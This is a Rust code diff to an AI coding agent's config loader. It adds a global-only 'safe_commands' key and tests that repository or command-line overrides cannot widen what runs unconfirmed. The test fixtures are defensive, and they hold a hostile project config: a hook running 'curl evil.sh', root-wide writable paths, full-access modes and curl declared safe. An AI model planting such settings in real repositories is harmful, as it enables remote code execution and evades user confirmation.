@@ -38,6 +38,10 @@ pub const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
 pub const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
 pub const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
 pub const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";
+/// Global only (security key). Programs the user declares side-effect free, on
+/// top of the built-in table (US-007). Widening what runs without a
+/// confirmation is exactly what a repository must not be able to do.
+pub const SAFE_COMMANDS_KEY: &str = "safe_commands";
 
 /// Recognized keys. A key absent from this list is reported without failing
 /// the startup (AC5): a file written for a newer version
@@ -56,6 +60,7 @@ const KNOWN_KEYS: &[&str] = &[
     INPUT_COST_KEY,
     OUTPUT_COST_KEY,
     OVERLOAD_FALLBACK_KEY,
+    SAFE_COMMANDS_KEY,
 ];
 
 /// Keys that widen a security perimeter. A workspace-controlled file
@@ -70,6 +75,7 @@ const SECURITY_KEYS: &[&str] = &[
     WRITABLE_ROOTS_KEY,
     HOOKS_KEY,
     PROFILE_KEY,
+    SAFE_COMMANDS_KEY,
 ];
 
 /// Canonical identifiers of the permission modes, in the order of the picker.
@@ -196,6 +202,9 @@ pub struct Config {
     pub input_cost_micro_per_ktok: Option<u64>,
     pub output_cost_micro_per_ktok: Option<u64>,
     pub overload_fallback_model: Option<String>,
+    /// Global only (security key). Programs declared side-effect free on top of
+    /// the built-in table (US-007).
+    pub safe_commands: Vec<agent_tools::command::SafeCommand>,
     /// Profile applied to this session (US-006), `None` when none was selected.
     /// Kept for `/status`: a profile that changes four keys at once is otherwise
     /// invisible in the effective values.
@@ -609,6 +618,7 @@ fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<
         INPUT_COST_KEY => config.input_cost_micro_per_ktok = Some(positive_u64(value)?),
         OUTPUT_COST_KEY => config.output_cost_micro_per_ktok = Some(positive_u64(value)?),
         OVERLOAD_FALLBACK_KEY => config.overload_fallback_model = Some(non_empty_string(value)?),
+        SAFE_COMMANDS_KEY => config.safe_commands = parse_safe_commands(value, &mut details)?,
         // `KNOWN_KEYS` filters upstream: this arm is unreachable and must
         // above all not panic should the list and this match ever diverge.
         other => return Err(format!("unhandled key `{other}`")),
@@ -618,6 +628,65 @@ fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<
 
 /// Hook declarations (US-017). An invalid entry is discarded with its reason and
 /// never fails the startup; the valid entries of the same array are kept.
+/// `safe_commands = [{ program = "just", subcommands = ["--list"] }]`.
+///
+/// A malformed entry is dropped with its reason, like a malformed hook: the
+/// session starts, and the user learns which line did nothing. The semantic
+/// checks (a path, a program the built-in table already covers) belong to
+/// `CommandPolicy::from_entries`, which is where the security rule lives.
+fn parse_safe_commands(
+    value: &toml::Value,
+    details: &mut Vec<String>,
+) -> Result<Vec<agent_tools::command::SafeCommand>, String> {
+    let array = value
+        .as_array()
+        .ok_or_else(|| "expected an array of tables".to_string())?;
+    let mut entries = Vec::with_capacity(array.len());
+    for (index, entry) in array.iter().enumerate() {
+        match parse_safe_command(entry, index, details) {
+            Ok(safe) => entries.push(safe),
+            Err(err) => details.push(format!("safe_commands #{index}: {err} (ignored)")),
+        }
+    }
+    Ok(entries)
+}
+
+const SAFE_COMMAND_KEYS: &[&str] = &["program", "subcommands", "denied"];
+
+fn parse_safe_command(
+    entry: &toml::Value,
+    index: usize,
+    details: &mut Vec<String>,
+) -> Result<agent_tools::command::SafeCommand, String> {
+    let table = entry
+        .as_table()
+        .ok_or_else(|| "expected a table".to_string())?;
+    for key in table.keys() {
+        if !SAFE_COMMAND_KEYS.contains(&key.as_str()) {
+            details.push(format!(
+                "safe_commands #{index}: unknown key `{key}` ignored"
+            ));
+        }
+    }
+    let program = non_empty_string(table.get("program").ok_or("missing `program`")?)?;
+    let list = |key: &str| -> Result<Vec<String>, String> {
+        match table.get(key) {
+            None => Ok(Vec::new()),
+            Some(value) => value
+                .as_array()
+                .ok_or_else(|| format!("`{key}`: expected an array of strings"))?
+                .iter()
+                .map(non_empty_string)
+                .collect(),
+        }
+    };
+    Ok(agent_tools::command::SafeCommand {
+        program,
+        subcommands: list("subcommands")?,
+        denied: list("denied")?,
+    })
+}
+
 fn parse_hooks(value: &toml::Value, details: &mut Vec<String>) -> Result<Vec<HookSpec>, String> {
     let array = value
         .as_array()
@@ -1060,7 +1129,7 @@ mod tests {
         );
         let project = dir.write(
             "config.toml",
-            "permission_mode = \"full-access\"\nsandbox_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\nprofile = \"yolo\"\n",
+            "permission_mode = \"full-access\"\nsandbox_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\nprofile = \"yolo\"\nsafe_commands = [{ program = \"curl\" }]\n",
         );
 
         let config = load(Some(&global), Some(&project));
@@ -1073,6 +1142,10 @@ mod tests {
         // for full access.
         assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
         assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/global")]);
+        assert!(
+            config.safe_commands.is_empty(),
+            "a repository must not be able to widen what runs unconfirmed"
+        );
         for key in SECURITY_KEYS {
             assert!(
                 config
@@ -1705,6 +1778,10 @@ mod tests {
             ("writable_roots".to_string(), "[\"/\"]".to_string()),
             ("hooks".to_string(), "[]".to_string()),
             ("profile".to_string(), "yolo".to_string()),
+            (
+                "safe_commands".to_string(),
+                "[{ program = \"curl\" }]".to_string(),
+            ),
             ("model".to_string(), "kept".to_string()),
         ];
 
@@ -1720,6 +1797,10 @@ mod tests {
         assert!(config.writable_roots.is_empty());
         assert!(config.hooks.is_empty());
         assert_eq!(config.profile, None);
+        assert!(
+            config.safe_commands.is_empty(),
+            "a command line must not be able to widen what runs unconfirmed"
+        );
         // The non-security override of the same command line still applies.
         assert_eq!(config.model.as_deref(), Some("kept"));
         for key in SECURITY_KEYS {
